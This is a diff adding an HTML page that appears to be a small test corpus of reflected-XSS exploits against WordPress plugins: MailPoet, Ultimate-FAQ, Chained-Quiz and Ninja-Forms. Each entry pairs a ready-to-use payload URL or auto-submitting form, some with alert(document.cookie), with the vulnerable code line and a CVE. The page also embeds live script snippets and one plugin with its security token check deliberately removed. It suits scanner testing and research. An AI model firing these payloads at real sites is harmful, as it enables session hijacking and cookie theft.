@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta charset="utf-8"/>
+      <title>rxss corpus</title>
+   </head>
+   <body>
+      <h3>A Tiny RXSS Corpus</h3>
+      <p> Note: Links with schema {hostname}/wp-admin/.* need the rememberme cookie from admin dashboard login</p>
+      <ul>
+         <li>
+            <h4>MailPoet GET Request rxss</h4>
+            Link Format => http://${WORDPRESS_HOSTNAME}/wp-admin/admin.php?page=mailpoet-newsletter-editor&id=1%3C%2Fscript%3E%3Cscript%3E${XSS_PAYLOAD}%3C%2Fscript%3E<br>
+            For instance: 
+            <a href="http://localhost/wp-admin/admin.php?page=mailpoet-newsletter-editor&id=1%3C%2Fscript%3E%3Cscript%3Ealert%28%22hello%22%29%3B%3C%2Fscript%3E">
+               http://localhost/wp-admin/admin.php?page=mailpoet-newsletter-editor&id=1%3C%2Fscript%3E%3Cscript%3Ealert%28%22hello%22%29%3B%3C%2Fscript%3E
+            </a>
+            <p>
+               Cause:<br>
+               File 'wp-content/plugins/mailpoet/lib/Twig/Functions.php' at line 128, no sanitization occuring in Twig Function(params) that retrieves GET parameters<br>
+               File 'wp-content/plugins/mailpoet/views/newsletter/editor.html' at line 1199, vulnerable params function used to get 'id' GET parameter<br>
+            </p>
+
+            References:<br>
+            <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11843">CVE-2019-11843</a><br>
+            <a href="https://github.com/mailpoet/mailpoet/issues/638">GitHub Issue</a><br>
+         </li>
+         &lt;script&gt;alert(121234)&lt;/script&gt;
+         <br>
+         <li>
+            <h4>Ultimate-FAQ GET Request rxss</h4>
+	         By simply embedding any Faq in a post/page enables this XSS. e.g. insert this in a post: [select-faq faq_id='1750']</br>
+            Link Format => http://${WORDPRESS_HOSTNAME}/index.php?p=${POST_ID}&Display_FAQ=%3C/script%3E%3Csvg/onload=${XSS_PAYLOAD}%3E<br>
+            For instance: 
+            <a href="http://localhost/index.php?p=1745&Display_FAQ=%3C/script%3E%3Csvg/onload=alert(/XSS/)%3E">
+               http://localhost/index.php?p=1745&Display_FAQ=%3C/script%3E%3Csvg/onload=alert(/XSS/)%3E
+            </a>
+            <p>
+               Cause:<br>
+               File 'wp-content/plugins/ultimate-faqs/Shortcodes/DisplayFAQs.php' at line 248, no sanitization occuring in GET parameter<br>
+               <code>
+                  $ReturnString .= &lt;script&gt;var Display_FAQ_ID = '&quot; . $_GET['Display_FAQ'] . &quot;-%Counter_Placeholder%';&lt;/script&gt;
+               </code>
+            </p>
+            References:<br>
+            <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7107">CVE-2020-7107</a><br>
+         </li>
+         <br>
+         <body onload=alert(121234)>
+         <li>
+            <h4>Chained-Quiz POST Request rxss</h4>
+            <form action="http://localhost/wp-admin/user-ajax.php" method="POST">
+               <input type="hidden" name="answer" value="x&#32;" />
+               <input type="hidden" name="answer" />
+               <input type="hidden" value="x&#32;" />
+               <input type="hidden" name="question&#95;type" value="" />
+               <input type="hidden" name="points" value="0" />
+               <input type="hidden" name="points" value="1" />
+               <input type="hidden" name="points" value="2" />
+               <input type="hidden" name="action" value="chainedquiz&#95;ajax" />
+               <input type="hidden" name="chainedquiz&#95;action" value="answer" />
+               <input type="hidden" name="total&#95;questions" value="1v4918&lt;script&gt;alert&#40;document&#46;cookie&#41;&lt;&#47;script&gt;eyjfw" />
+               <input type="submit" value="execute rxss" />
+            </form>
+            <form>
+               <input type="hidden" name="test" value="default" />
+               <input type="submit" value="execute rxss" />
+            </form>
+            <form action="http://google.com/wp-admin/admin-ajax.php" method="POST">
+               <input type="hidden" name="answer" value="x&#32;" />
+               <input type="hidden" name="question&#95;id" value="1" />
+               <input type="hidden" name="quiz&#95;id" value="1" />
+               <input type="hidden" name="post&#95;id"a value="5" />
+               <input type="hidden" name="question&#95;type" value="radio" />
+               <input type="hidden" name="points" value="0" />
+               <input type="hidden" name="action" value="chainedquiz&#95;ajax" />
+               <input type="hidden" name="chainedquiz&#95;action" value="answer" />
+               <input type="hidden" name="total&#95;questions" value="1v4918&lt;script&gt;alert&#40;document&#46;cookie&#41;&lt;&#47;script&gt;eyjfw" />
+               <input type="submit" value="execute rxss" />
+            </form>
+
+            <p> 
+               Cause:<br>   
+               POST parameter 'total_questions' outputted without sanitizing it first in registered ajax call 'chainedquiz_ajax'<br>
+               <br>
+               Stack Trace:<br>
+                  File 'wp-content/plugins/chained-quiz/chained-quiz.php' line 42, 
+                     <code>add_action('wp_ajax_chainedquiz_ajax', 'chainedquiz_ajax');</code><br>
+                  File 'wp-content/plugins/chained-quiz/controllers/ajax.php' line 14,
+                     <code>echo ChainedQuizQuizzes :: answer_question();</code><br>
+                  File 'wp-content/plugins/chained-quiz/controllers/quizzes.php' line 202,
+                     <code>echo $_quiz->finalize($quiz, $points); // if none, submit the quiz</code><br>
+                  File 'wp-content/plugins/chained-quiz/models/quiz.php' at line 103,               
+                     <code>$output = str_replace('{{questions}}', $_POST['total_questions'], $output);</code><br>
+            <br>
+            References:<br>
+            <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7104">CVE-2020-7104</a><br>
+         </li>
+         <br>
+         <li>
+            <h4>Ninja-Forms v.3.2.13 POST Request rxss (semi-artificial)</h4>
+            <form action="http://localhost/wp-admin/root-ajax.php" method="POST">
+               <input type="hidden" name="action" value="nf_ajax_submit" />
+               <input type="hidden" name="formData" value='{"id":"1", "fields": { "1": { "value" : "<body onload=alert&#40;document&#46;cookie&#41;>", "id": 1}}}' />
+               <input type="submit" value="execute rxss" />
+            </form>
+            <p>
+               Cause:<br>
+               Response is in JSON but Content-type header not sent. As a result payload is parsed as HTML<br>
+               File 'wp-content/plugins/ninja-forms-o/includes/AJAX/Controllers/Submission.php' in method submit()<br>
+               <br>
+               References:<br>
+                  <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7280">CVE-2018-7280</a><br>
+               <br> 
+               Note: Security token check had to be removed for this XSS to work<br>
+            </p>
+         </li>
+         <br>
+         <li>
+            <h4>Ninja-Forms v3.3.21 GET Request rxss</h4>
+            Link Format => http://${WORDPRESS_HOSTNAME}/wp-admin/admin.php?page=ninja-forms&success=%27%3C%2Fscript%3E%3Cscript%3E${XSS_PAYLOAD}%2Fscript%3E<br>
+            For instance:
+            <a href="http://localhost/wp-admin/admin.php?page=ninja-forms&success=%27%3C%2Fscript%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E">
+               http://localhost/wp-admin/admin.php?page=ninja-forms&success=%27%3C%2Fscript%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E
+            </a>
+            <p>
+               Cause:<br>
+               File 'wp-content/plugins/ninja-forms/includes/Admin/Menus/Forms.php' at line 133, no sanitization occuring in GET parameter 'success'<br>
+               <code>
+                  var serviceSuccess = '&lt;?php echo ( isset( $_GET[ 'success' ] ) ) ? $_GET[ 'success' ] : ''; ?&gt;';
+               </code><br>
+            </p>
+            References:<br>
+               <a href="https://wordpress.org/plugins/ninja-forms/#developers">Ninja-Forms ChangeLog at Version 3.3.21.1 (3 JANUARY 2019)</a><br>
+               <a href="https://plugins.trac.wordpress.org/changeset?old=2005868&old_path=ninja-forms&new=2005863&new_path=ninja-forms">Diff that fixes bug</a><br>
+            <br> 
+            Note: This plugin clashes with Ninja Forms v3.2.13, so disable it first<br>
+            <scrIpt id="ert">alert(0xdeadbeef);</script>
+            <div class="hello&amp;amp;amp;you"></div>
+         </li>
+      </ul>
+   </body>
+</html>
